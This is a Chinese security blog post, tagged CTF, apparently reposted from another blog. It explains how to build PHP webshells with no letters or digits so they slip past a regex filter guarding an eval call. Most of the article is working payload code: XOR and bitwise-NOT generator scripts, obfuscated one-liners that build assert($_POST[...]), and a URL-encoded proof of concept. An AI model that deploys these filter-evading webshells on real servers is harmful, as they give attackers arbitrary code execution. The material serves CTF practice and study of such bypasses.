@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"monkeyx1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="转载自： [一些不包含数字和字母的webshell](https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;webshell-without-alphanum.html) [无字母数字webshell之提](https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;webshell-without-alphanum-advanced.html)[高篇](">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不包含字母和数字的webshell">
+<meta property="og:url" content="https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/index.html">
+<meta property="og:site_name" content="monkey111">
+<meta property="og:description" content="转载自： [一些不包含数字和字母的webshell](https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;webshell-without-alphanum.html) [无字母数字webshell之提](https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;webshell-without-alphanum-advanced.html)[高篇](">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-150-1024x539.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-152-1024x531.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-92.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-153-1024x540.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-96-1024x162.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-97-1024x543.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-98.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-99.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-100-1024x543.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-101-1024x119.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-154-1024x539.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-156-1024x541.png">
+<meta property="og:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-176-1024x459.png">
+<meta property="article:published_time" content="2022-10-18T03:11:21.000Z">
+<meta property="article:modified_time" content="2024-07-27T17:31:00.699Z">
+<meta property="article:author" content="monkey111">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyx1.github.io/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-150-1024x539.png">
+
+
+<link rel="canonical" href="https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/","path":"2022/10/18/不包含字母和数字的webshell/","title":"不包含字母和数字的webshell"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>不包含字母和数字的webshell | monkey111</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">monkey111</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">欢迎来到小菜猴子的安全小窝</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%AF%87"><span class="nav-number"></span> <span class="nav-text">基础篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%8F%90%E5%87%BA%E9%97%AE%E9%A2%98"><span class="nav-number">0.1.</span> <span class="nav-text">一、提出问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%80%9D%E8%B7%AF"><span class="nav-number">0.2.</span> <span class="nav-text">二、思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">0.3.</span> <span class="nav-text">三、方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-number">0.4.</span> <span class="nav-text">四、方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%96%B9%E6%B3%95%E4%B8%89"><span class="nav-number">0.5.</span> <span class="nav-text">五、方法三</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E9%AB%98%E7%AF%87"><span class="nav-number"></span> <span class="nav-text">提高篇</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP7%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="nav-number">0.1.</span> <span class="nav-text">PHP7下绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP5%E4%B8%8B%E7%BB%95%E8%BF%87"><span class="nav-number">0.2.</span> <span class="nav-text">PHP5下绕过</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="monkey111"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">monkey111</p>
+  <div class="site-description" itemprop="description">自先沉稳，而后爱人</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/monkeyx1" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monkeyx1" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:647498949@qq.com" title="E-Mail → mailto:647498949@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="monkey111">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="monkey111">
+      <meta itemprop="description" content="自先沉稳，而后爱人">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="不包含字母和数字的webshell | monkey111">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          不包含字母和数字的webshell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-10-18 11:11:21" itemprop="dateCreated datePublished" datetime="2022-10-18T11:11:21+08:00">2022-10-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-07-28 01:31:00" itemprop="dateModified" datetime="2024-07-28T01:31:00+08:00">2024-07-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2022/10/18/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/" class="post-meta-item leancloud_visitors" data-flag-title="不包含字母和数字的webshell" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>9.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>转载自：</p>
+<p>[一些不包含数字和字母的webshell](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum.html)</p>
+<p>[无字母数字webshell之提](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-">https://www.leavesongs.com/PENETRATION/webshell-without-</a><br>alphanum-advanced.html)[高篇](<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-">https://www.leavesongs.com/PENETRATION/webshell-</a><br>without-alphanum-advanced.html)</p>
+<p>首先感谢离别歌师傅的文章，有兴趣的小伙伴可以关注一下离别歌师傅的个人博客：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/">离别歌</a></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li>基础篇<ul>
+<li>一、提出问题</li>
+<li>二、思路</li>
+<li>三、方法一</li>
+<li>四、方法二</li>
+<li>五、方法三</li>
+</ul>
+</li>
+<li>提高篇<ul>
+<li>PHP7下绕过</li>
+</ul>
+</li>
+</ul>
+<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h3 id="一、提出问题"><a href="#一、提出问题" class="headerlink" title="一、提出问题"></a>一、提出问题</h3><p>如何编写一个不使用字母和数字的webshell？</p>
+<pre><code>&lt;?php
+highlight_file(__FILE__);
+if (!preg_match(&#39;/[a-z0-9]/is&#39;, $_GET[&#39;shell&#39;])) &#123;
+    eval($_GET[&#39;shell&#39;]);
+&#125; else &#123;
+    echo &quot;hacker&quot;;
+&#125;
+</code></pre>
+<h3 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h3><p>使用非数字、字母的字符进行变换来得到字母和数字。</p>
+<h3 id="三、方法一"><a href="#三、方法一" class="headerlink" title="三、方法一"></a>三、方法一</h3><p>使用异或运算，两个字符串异或操作之后，得到的还是一个字符串，所以我们可以通过两个字符异或运算来得到另外一个字符。</p>
+<blockquote>
+<p>写的PHP代码来得到我们想要的字符串：</p>
+</blockquote>
+<pre><code>&lt;?php
+/**
+ * 1、我需要做什么？
+ * 我需要的是将两个非字母数字的字符异或之后得到某个字母
+ * 2、我该怎么做？
+ *      使用一个循环来跟指定的字符进行异或，再判断是否是我们想要的内容
+ */
+$a = &quot;]&quot;;
+// 这个值必须是没有被过滤的值
+$argv = str_split(&quot;POST&quot;);
+// 这里是你要异或得到的值
+for ($i = 0; $i &lt; count($argv); $i++) &#123;
+    for ($j = 0; $j &lt; 255; $j++) &#123;
+        $k = chr($j) ^ $a;
+        if ($k == $argv[$i]) &#123;
+            $flag = dechex($j);
+            if (strlen($flag) &lt; 2) &#123;
+                $flag = &quot;%0&quot; . $flag;
+                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;
+            &#125; else &#123;
+                $flag = &quot;%&quot; . $flag;
+                echo &quot;(&#39;$flag&#39;^&#39;$a&#39;).&quot;;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>写的勉勉强强，大佬别骂……</p>
+<p>然后我们可以构造这样的内容</p>
+<pre><code>$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); // $_=assert$__=&#39;_&#39;.(&#39;%0d&#39;^&#39;]&#39;).(&#39;%12&#39;^&#39;]&#39;).(&#39;%0e&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__=_POST$___=$$__;$_($___[_]); // assert($_POST[_]);
+</code></pre>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-150-1024x539.png"></p>
+<blockquote>
+<p>这里有一个疑问，为什么前面的assert跟<code>]</code>搭配就没作用了，后面的POST跟&#96;&#96;&#96;搭配也没有作用</p>
+</blockquote>
+<p>这里还有一个别人的脚本</p>
+<pre><code>&lt;?php
+$l = &quot;&quot;;
+$r = &quot;&quot;;
+$argv = str_split(&quot;POST&quot;);
+for ($i = 0; $i &lt; count($argv); $i++) &#123;
+    for ($j = 0; $j &lt; 255; $j++) &#123;
+        $k = chr($j) ^ chr(255);
+        // dechex(255) = ff
+        if ($k == $argv[$i]) &#123;
+            if ($j &lt; 16) &#123;
+                $l .= &quot;%ff&quot;;
+                $r .= &quot;%0&quot; . dechex($j);
+                continue;
+            &#125;
+            $l .= &quot;%ff&quot;;
+            $r .= &quot;%&quot; . dechex($j);
+            continue;
+        &#125;
+    &#125;
+&#125;
+echo &quot;(&#39;$l&#39;^&#39;$r&#39;)&quot;;
+?&gt;
+
+// poc$_=(&#39;%ff%ff%ff%ff%ff%ff&#39;^&#39;%9e%8c%8c%9a%8d%8b&#39;);// assert$__=&#39;_&#39;.(&#39;%ff%ff%ff%ff&#39;^&#39;%af%b0%ac%ab&#39;);// _POST$___=$$__;// $_POST$_($___[_]);// assert($_POST[_])
+</code></pre>
+<p>也是可以使用的</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-152-1024x531.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<h3 id="四、方法二"><a href="#四、方法二" class="headerlink" title="四、方法二"></a>四、方法二</h3><p>这个方法和第一个方法是差不多的，但是编写脚本……算了吧，我还是使用大佬现成的吧。这个方法是利用取反来得到字母，比如<code>&#39;和&#39;&#123;2&#125;</code>得到的结果为<code>\x8c</code>，取反得到的字母为<code>s</code>。这里想不太明白，复现成功，PHP版本会产生一定的影响，先放在这里，找时间来看看</p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-92.png"></p>
+<pre><code>&lt;?php
+$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);
+$_ = $__ / $__;
+$____ = &#39;&#39;;
+$___ = &quot;瞰&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$___ = &quot;的&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;半&quot;;
+$____ .= ~($___&#123;$_&#125;);
+$___ = &quot;始&quot;;
+$____ .= ~($___&#123;$__&#125;);
+$_____ = &#39;_&#39;;
+$___ = &quot;俯&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+$___ = &quot;瞰&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+$___ = &quot;次&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+$___ = &quot;站&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+$_ = $$_____;
+$____($_[$__]);
+</code></pre>
+<p>这里最好进行一次url编码</p>
+<blockquote>
+<p>poc</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc:%24%20%3D%20(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%2B(&#x27;%3E&#x27;%20%3E%20&#x27;%3C&#x27;)%3B%24_%20%3D%20%24%20%2F%20%24%3B%24_%20%3D%20&#x27;&#x27;%3B%24%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E5%92%8C%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%9A%84%22%3B%24_%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%8D%8A%22%3B%24%20.%3D%20~(%24___%7B%24%7D)%3B%24%20%3D%20%22%E5%A7%8B%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20&#x27;</span><br><span class="line">_&#x27;%3B%24_</span><br><span class="line">%20%3D%20%22%E4%BF%AF%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24_%20%3D%20%22%E7%9E%B0%22%3B%24_%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E6%AC%A1%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%22%E7%AB%99%22%3B%24%20.%3D%20~(%24_%7B%24%7D)%3B%24%20%3D%20%24%24_%3B%0A%24(%24_%5B%24__%5D)%3B</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/image-153-1024x540.png"></p>
+<blockquote>
+<p>经过测试发现：对PHP版本有限制（这只是个人测试的，不代表最终效果）</p>
+<p>5.3.9&lt;&#x3D;PHP&lt;&#x3D;7.0.9</p>
+</blockquote>
+<p>这里是利用了PHP的弱类型特性。因为要获取<code>&#39;和&#39;&#123;2&#125;</code>，就必须有数字2。而PHP是弱类型语言，true的值为1，所以<code>true+true==2</code>，也就是<code>(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2</code></p>
+<p><img src="/images/%E4%B8%8D%E5%8C%85%E5%90%AB%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97%E7%9A%84webshell/%E5%9B%BE%E7%89%87-96-1024x162.png"></p>
+<blockquote>
+<p>将上面的代码运行一下（这里还有一些注释，大佬果然不一样啊……）</p>
+</blockquote>
+<pre><code>&lt;?php
+$__ = (&#39;&gt;&#39; &gt; &#39;&lt;&#39;) + (&#39;&gt;&#39; &gt; &#39;&lt;&#39;);
+// $__ = 2
+$_ = $__ / $__;
+// $_ = 1
+$____ = &#39;&#39;;
+$___ = &quot;瞰&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;瞰&quot;&#123;1&#125;) =&gt; a
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; as
+$___ = &quot;和&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;和&quot;&#123;2&#125;) =&gt; ass
+$___ = &quot;的&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;的&quot;&#123;1&#125;) =&gt; asse
+$___ = &quot;半&quot;;
+$____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;半&quot;&#123;1&#125;) =&gt; asser
+$___ = &quot;始&quot;;
+$____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;始&quot;&#123;2&#125;) =&gt; assert
+//# 最后:$____ = assert
+$_____ = &#39;_&#39;;
+$_____ = &#39;_&#39;;
+$___ = &quot;俯&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;俯&quot;&#123;2&#125;) =&gt; _P
+$___ = &quot;瞰&quot;;
+$_____ .= ~($___&#123;$__&#125;);
+// $___ = ~(&quot;瞰&quot;&#123;2&#125;) =&gt; _PO
+$___ = &quot;次&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;次&quot;&#123;1&#125;) =&gt; _POS
+$___ = &quot;站&quot;;
+$_____ .= ~($___&#123;$_&#125;);
+// $___ = ~(&quot;站&quot;&#123;1&#125;) =&gt; _POST
+// 最后:$_____ = _POST
+$_ = $$_____;// $_POST
+$____($_[$__]);// assert($_POST[2])
+</code></pre>
